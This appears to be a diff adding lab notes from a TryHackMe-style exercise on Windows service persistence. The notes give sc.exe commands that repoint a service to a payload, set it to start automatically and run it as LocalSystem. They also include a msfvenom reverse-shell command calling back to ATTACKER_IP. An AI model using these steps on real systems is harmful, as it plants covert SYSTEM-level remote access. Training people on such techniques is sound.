@@ -1,0 +1,27 @@
+List of available Windows - services using the following command:
+    -sc.exe query state=all
+
+To query the service's configuration, you can use the following command:
+    -sc.exe qc [SERVICE NAME]
+
+    There are three things we care for persistence:
+
+    -The executable (BINARY_PATH_NAME) should point to our payload.
+    -The service START_TYPE should be automatic so that the payload runs without user interaction.
+    -The SERVICE_START_NAME, which is the account under which the service will run, should be set to "LocalSystem" to gain SYSTEM privileges.
+
+Let's start by creating a new reverse shell with msfvenom:
+
+AttackBox
+Kali:
+    -msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4545 -f exe-service -o rev-svc2.exe
+
+To reconfigure "THMservice3" parameters, we can use the following command:
+
+Windows:
+    -sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
+
+You can then query the service's configuration again to check if all went as expected:
+
+Windows:
+    -sc.exe qc THMservice3
